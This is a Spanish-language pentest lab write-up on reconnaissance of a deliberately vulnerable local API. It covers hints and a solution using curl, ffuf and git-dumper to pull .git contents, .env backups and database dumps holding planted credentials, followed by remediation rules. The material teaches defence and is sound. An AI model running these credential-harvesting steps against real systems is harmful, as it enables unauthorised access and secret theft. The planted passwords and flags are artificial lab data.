# LAB 11 - Reconocimiento y Archivos Expuestos

## Fase de la Metodologia: 1 - RECON

---

## Objetivo

Aplicar la primera fase del pentest de API: **enumeracion de archivos y rutas estaticas expuestas accidentalmente**. El alumno debe descubrir backups, archivos de configuracion, restos de control de versiones y notas internas que le permitan reconstruir credenciales y mapear los siguientes pasos.

Esta es la fase **mas barata** del pentest (puramente HTTP GET) y la que mas pistas da para las fases 2 a 5.

---

## Contexto

Los equipos de desarrollo dejan **rastros** en el docroot que un atacante recupera con peticiones HTTP simples:

- Archivos de control de versiones (`.git/`, `.svn/`, `.hg/`)
- Backups con extension `.bak`, `.old`, `.swp`, `~`, `.orig`
- Dumps de base de datos (`.sql`, `.sql.gz`, `backup/`)
- Archivos de IDE/SO (`.DS_Store`, `.vscode/`, `.idea/`)
- Archivos de notas (`notes.txt`, `TODO.md`, `README.local`)
- Archivos de dependencias (`composer.json`, `composer.lock`, `package.json`, `yarn.lock`)
- Archivos de debug (`phpinfo.php`, `info.php`, `test.php`)
- Paneles administrativos olvidados (`adminer.php`, `phpmyadmin/`)
- Archivos `.well-known/` y `robots.txt` que paradojicamente revelan rutas

---

## Herramientas Recomendadas

| Herramienta | Uso |
|---|---|
| `gobuster dir` | Bruteforce de directorios y archivos |
| `ffuf` | Fuzzing rapido con wordlists grandes |
| `feroxbuster` | Bruteforce recursivo |
| `dirsearch` | Especializado en archivos web |
| `nuclei -t exposures/` | Templates de exposicion conocidos |
| `git-dumper` | Recupera codigo desde `.git/` expuesto |
| `wget --mirror` | Mirror del sitio para grep posterior |
| `curl` + `for` | Scripts ad-hoc |

---

## Wordlists Recomendados

```
SecLists/Discovery/Web-Content/raft-medium-files.txt
SecLists/Discovery/Web-Content/raft-medium-directories.txt
SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
SecLists/Discovery/Web-Content/quickhits.txt
SecLists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt   (descartar WP)
wordlists/cryptovulnx-custom.txt                          (incluido en este lab)
```

---

## Hallazgos esperados

| Ruta | Que expone | Para que sirve |
|---|---|---|
| `/robots.txt` | Disallow con todas las rutas "secretas" | Mapa del lab |
| `/sitemap.xml` | URLs publicas + legacy | Inventario inicial |
| `/.well-known/security.txt` | Apunta a swagger y openapi | Pista para Fase 2 |
| `/.git/HEAD` + `/.git/config` + `/.git/logs/HEAD` | Codigo recuperable, remote URL interna, historial de commits | Reconstruir codigo, ver `JWT_SECRET=crypto123` |
| `/.env.bak`, `/.env.old` | Credenciales rotadas pero validas, master keys | Acceso a debug.php, RCE en exec.php |
| `/.DS_Store` | Listado de archivos del Mac del dev | Nombres internos |
| `/notes.txt` | Tokens hardcoded, headers magicos, query params ocultos | Insumo para Fases 2, 3 y 4 |
| `/TODO.md` | Lista de cosas que el dev no termino de proteger | Insumo para todas las fases |
| `/composer.json` + `/composer.lock` | Versiones de libs con CVE | Componentes vulnerables |
| `/backup.sql`, `/backup/db_*.sql` | Dump con `password_plain` y `private_key` | Login directo + claves |
| `/phpinfo.php`, `/info.php` | `phpinfo()` completo | Variables de entorno, paths, modulos |
| `/test.php` | Imprime DB_PASS, JWT_SECRET, conexion DB | Credenciales en claro |
| `/adminer.php` | Login a MySQL con credenciales en HTML comment | Acceso directo a la DB |

---

## Dificultad

**Baja** - solo requiere ejecutar fuzzing con wordlists publicos y leer respuestas con calma.

---

## Pistas

<details>
<summary>Pista 1 - Empezar por robots.txt y sitemap.xml</summary>

```bash
curl -s http://localhost:8080/robots.txt
curl -s http://localhost:8080/sitemap.xml
```

`robots.txt` tiene una lista exhaustiva de Disallow. El staff lo escribio pensando que "ocultaba" las rutas, pero hizo lo opuesto: las publico.

</details>

<details>
<summary>Pista 2 - Fuzzing de archivos backup</summary>

```bash
ffuf -w SecLists/Discovery/Web-Content/raft-medium-files.txt \
     -u http://localhost:8080/FUZZ \
     -mc 200,301,302 \
     -fs 0 \
     -of csv -o recon.csv
```

Los hits interesantes seran: `.env.bak`, `.env.old`, `notes.txt`, `TODO.md`, `backup.sql`, `phpinfo.php`, `info.php`, `test.php`, `adminer.php`, `composer.json`, `composer.lock`, `.DS_Store`.

</details>

<details>
<summary>Pista 3 - Recuperar el codigo via .git/</summary>

```bash
# Verificar que .git/ esta expuesto
curl -s http://localhost:8080/.git/HEAD
curl -s http://localhost:8080/.git/config
curl -s http://localhost:8080/.git/logs/HEAD

# El log de commits ya da pistas:
# "commit: hotfix - hardcoded JWT_SECRET=crypto123 in jwt.php"
# "commit: deploy v2 beta of /api/v2/auth/login.php (no rate limit)"
# "commit: add /api/v3/admin/exec.php for internal devops use - DO NOT MERGE TO PROD"

# Para descargar el repo completo (cuando hay objects/):
pip install git-dumper
git-dumper http://localhost:8080/.git/ ./recovered/
cd recovered && git log --oneline
```

</details>

<details>
<summary>Pista 4 - Backups de DB</summary>

```bash
# Dump principal
curl -s http://localhost:8080/backup.sql | grep INSERT

# Resultado: usuarios con password_plain
# admin / admin123
# devops_internal / devops_master_2024!
# qa_bot / qa_bot_static_pass

# Dump diario (cron del docroot)
curl -s http://localhost:8080/backup/db_2026-04-15.sql
```

Los dumps tambien revelan **arquitectura interna**: hostnames `10.0.1.50`, IAM role ARN, S3 buckets de backups y de KYC.

</details>

<details>
<summary>Pista 5 - Listado de directorios</summary>

```bash
# Apache puede tener Options +Indexes en /uploads/ y /backup/
curl -s http://localhost:8080/uploads/
curl -s http://localhost:8080/uploads/kyc/
curl -s http://localhost:8080/backup/
```

Si listing esta habilitado, podes descargar imagenes de KYC de otros usuarios (refuerza LAB01 BOLA).

</details>

---

## Solucion Resumida

### Paso 1: Recon basico

```bash
TARGET=http://localhost:8080

# robots y sitemap
curl -s $TARGET/robots.txt
curl -s $TARGET/sitemap.xml
curl -s $TARGET/.well-known/security.txt

# git
for f in HEAD config description logs/HEAD info/exclude COMMIT_EDITMSG refs/heads/main; do
    echo "=== /.git/$f ==="
    curl -s $TARGET/.git/$f
done
```

### Paso 2: Fuzzing automatizado

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
     -u $TARGET/FUZZ \
     -mc 200 -fs 0 -t 50 \
     -e .bak,.old,.swp,~ \
     -of csv -o recon_files.csv

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
     -u $TARGET/FUZZ/ \
     -mc 200,301,403 -t 50 \
     -of csv -o recon_dirs.csv
```

### Paso 3: Extraer credenciales

```bash
# Del backup
curl -s $TARGET/backup.sql | grep -E "password_plain|private_key|jwt_secret"

# De .env.bak y .env.old
curl -s $TARGET/.env.bak
curl -s $TARGET/.env.old

# De notes.txt
curl -s $TARGET/notes.txt | grep -i -E "secret|token|pass"

# Del test.php
curl -s $TARGET/test.php
```

### Paso 4: Componentes vulnerables

```bash
curl -s $TARGET/composer.lock | python -m json.tool | grep -E "version|cve_note"
```

Cada version tiene un `_cve_note` que documenta el CVE conocido (en el lab esta plantado para didactica; en pentest real usarias `safety check`, `npm audit`, `composer audit`, `osv-scanner`).

---

## Flags recolectados

Esta fase deja los siguientes flags textuales (no criptograficos, sirven para auto-validacion):

```
FLAG-RECON-01  -> en .env.bak (creds viejas siguen funcionando)
FLAG-RECON-02  -> en notes.txt (pista para fase 2: swagger)
FLAG-RECON-03  -> en TODO.md (pista para fase 3: endpoints admin via logs.php)
FLAG-RECON-04  -> en .git/COMMIT_EDITMSG (gitlab interno)
FLAG-RECON-05  -> en backup.sql (admin/admin123)
FLAG-RECON-06  -> en backup/db_*.sql (arquitectura interna)
FLAG-RECON-07  -> en adminer.php (creds DB en HTML comment)
FLAG-RECON-08  -> en .well-known/security.txt
```

---

## Como esto encadena con las siguientes fases

| Hallazgo de Fase 1 | Habilita en Fase... |
|---|---|
| `JWT_SECRET=crypto123` (en `.git/logs/HEAD`, `notes.txt`, `test.php`) | Fase 5 - LAB02 (forjar JWT) |
| `admin/admin123` (en `backup.sql`) | Fase 5 - LAB05 BFLA (login admin) |
| Listado de endpoints en `notes.txt` y `TODO.md` | Fase 2 (verificar swagger) y Fase 3 (fuzzing dirigido) |
| Headers magicos en `notes.txt` (`X-Debug-Token`, `X-Original-URL`) | Fase 4 (header fuzzing) |
| Query params en `notes.txt` (`?debug=1`, `?include=*`) | Fase 4 (param fuzzing) |
| Composer.lock con CVEs | Fase 5 - explotacion via libreria |

---

## Remediacion

```apache
# .htaccess - Bloquear archivos sensibles
<FilesMatch "^(\.|composer\.|backup|notes|TODO|.*\.bak|.*\.old|.*\.sql|.*\.swp).*$">
    Require all denied
</FilesMatch>

# Bloquear directorios de control de versiones
RedirectMatch 404 /\.git
RedirectMatch 404 /\.svn
RedirectMatch 404 /\.hg

# Desactivar listing de directorios
Options -Indexes
```

```php
// Remover phpinfo.php, info.php, test.php, adminer.php del docroot
// Mover backups fuera del docroot:
//   mv backup/ /var/lib/cryptovulnx-backups/
//   chmod 700 /var/lib/cryptovulnx-backups/
```

```dockerignore
# .dockerignore - Excluir del build
.git
.env
.env.bak
.env.old
.DS_Store
notes.txt
TODO.md
backup
backup.sql
*.bak
*.old
*.swp
```
